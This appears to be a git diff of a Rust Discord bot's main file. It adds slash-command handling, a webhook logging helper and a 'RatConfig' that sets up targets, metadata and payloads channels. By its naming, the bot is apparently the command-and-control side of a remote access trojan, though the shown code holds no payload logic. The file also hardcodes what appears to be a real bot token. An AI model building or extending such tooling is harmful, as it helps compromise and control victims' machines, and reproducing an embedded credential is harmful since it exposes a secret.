@@ -11,13 +11,18 @@ use commands::{
     target::*,
     owner::*
 };
-use serenity::framework::standard::DispatchError;
 
+use std::borrow::Borrow;
 use std::process::exit;
 use std::collections::{HashSet, HashMap};
 use std::sync::Arc;
 
-use serenity::json::Value;
+use serenity::model::permissions::Permissions;
+use serenity::model::prelude::interaction::Interaction;
+use serenity::model::prelude::command::CommandType;
+use serenity::framework::standard::DispatchError;
+use serenity::model::application::command::Command;
+use serenity::json::{Value, json};
 use serenity::model::{
     prelude::Activity,
     user::OnlineStatus,
@@ -33,15 +38,9 @@ use serenity::model::{
     id::UserId,
 };
 use serenity::prelude::*;
-use serenity::builder;
+use serenity::builder::{self, CreateApplicationCommand};
 
 use sysinfo::{System, SystemExt, UserExt, *};
-use reqwest;
-use owo_colors::{
-    colors::*,
-    OwoColorize, Style
-};
-
 
 struct Handler;
 
@@ -50,11 +49,20 @@ impl EventHandler for Handler {
     // when an unknown even occurs this event will be called
     async fn unknown(&self, ctx: Context, name: String, value: Value) {
         println!(
-            " {} Unknown event occurred\n name = {}\n value = {}",
+            " {} Unknown event occurred\n   name = {}\n   value = {}",
             Pr::err(),
             name,
             value
         );
+    }
+
+    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
+        if let Interaction::ApplicationCommand(command) = interaction {
+            match command.data.name.as_str() {
+                "WEEEEEE" => {println!(" {} SLASH command interaction", Pr::event());},
+                _ => {}
+            }
+        }
     }
 
     // Set a handler for the `message` event - so that whenever a new message
@@ -62,17 +70,10 @@ impl EventHandler for Handler {
     //
     // Event handlers are dispatched through a threadpool, and so multiple
     // events can be dispatched simultaneously.
-    // async fn message(&self, ctx: Context, msg: Message) {
-    //     if msg.content == "aadadaw" {
-    //         // Sending a message can fail, due to a network error, an
-    //         // authentication error, or lack of permissions to post in the
-    //         // channel, so log to stdout when some error happens, with a
-    //         // description of it.
-    //         if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
-    //             println!("Error sending message: {:?}", why);
-    //         }
-    //     }
-    // }
+    async fn message(&self, ctx: Context, msg: Message) {
+        
+    
+    }
 
     // Set a handler to be called on the `ready` event. This is called when a
     // shard is booted, and a READY payload is sent by Discord. This payload
@@ -82,27 +83,25 @@ impl EventHandler for Handler {
     // In this case, just print what the current user's username is.
     async fn ready(&self, ctx: Context, ready: Ready) {
         // send a webhook in the LOGS channel saying that the bot is now online
-        let http = Http::new("");
-        let webhook = Webhook::from_url(&http, LOG_WEBHOOK).await
-            .expect("Couldn't create webhook")
-            .execute(&http, false, |f| f
-                .content(create_log_msg("Bot is now online!".to_string()))
-            ).await.expect("Couldn't send OFF webhook");
+        send_log_webhook(LOG_WEBHOOK.to_string(), "Bot is now online!").await;
 
+        // set custom status and on do not disturb mode
         ctx.set_presence(
             Some(Activity::watching(format!("prefix {}", BOT_PREFIX))),
             OnlineStatus::DoNotDisturb
         ).await;
 
-        // println!(" version : {}", c.http.create_channel(guild_id, map, audit_log_reason));
+        let rat_config = RatConfig::new(TARGETS_CHANNEL_ID, METADATA_CHANNEL_ID, PAYLOADS_CHANNEL_ID);
+        rat_config.config_targets_channel(&ctx).await;
 
-
+        // print that the bot is now online and ready to use
         println!(" {} {} is connected!", Pr::bot(), ready.user.tag());
     }
 }
 
 #[tokio::main]
 async fn main() {
+    clear_console();
     println!(" {} Script start up", Pr::app());
     // Configure the client with your Discord bot token in the environment.
     let token = "MTAyNDc0NDUwMDI1OTcyOTQ2OA.GfVUbS.y2DaEldO7wth-FELlMrdZIICoTbysaJ8Gg1kaE";
@@ -116,6 +115,7 @@ async fn main() {
             ].into_iter().collect())
             .case_insensitivity(true)
             .prefix(BOT_PREFIX)
+            .allow_dm(false)
         )
         .group(&GENERAL_GROUP)
         .group(&OWNERCOMMANDS_GROUP)
@@ -142,14 +142,13 @@ async fn main() {
     if let Err(why) = client.start_autosharded().await {
         // if bot couldn't start up send a log message via webhook
         println!(" {} Couldn't start bot :(", Pr::err());
-        let http = Http::new("");
-        let webhook = Webhook::from_url(&http, LOG_WEBHOOK).await
-            .expect("Couldn't create webhook")
-            .execute(&http, false, |f| f
-            .content(create_log_msg(format!("Bot ERROR couldn't start because: {}", why)))
-        ).await.expect("Couldn't send OFF webhook");
+        send_log_webhook(
+            LOG_WEBHOOK.to_string(),
+            format!("An error occurred :( while trying to start the bot: {}", why).as_str()
+        ).await;
     }
 }
+
 
 #[hook]
 async fn error_handler(
